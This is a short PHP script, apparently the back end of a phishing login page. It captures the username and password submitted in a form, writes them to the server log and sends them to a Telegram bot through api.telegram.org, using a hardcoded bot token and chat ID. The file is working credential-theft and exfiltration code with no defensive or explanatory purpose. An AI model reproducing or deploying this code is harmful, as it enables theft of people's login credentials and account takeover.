<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $log = "🔥 Ogun Tracker 🔥\nUsername: $username | Password: $password\n";

    // Save to Railway Logs 🔥
    error_log($log);

    // Send to Telegram
    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // 🔑
    $chat_id = "1559369377"; // 🔑
    $msg = urlencode($log);
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$msg");

    echo "Ogun Tracker Activated ✅";
}
?>
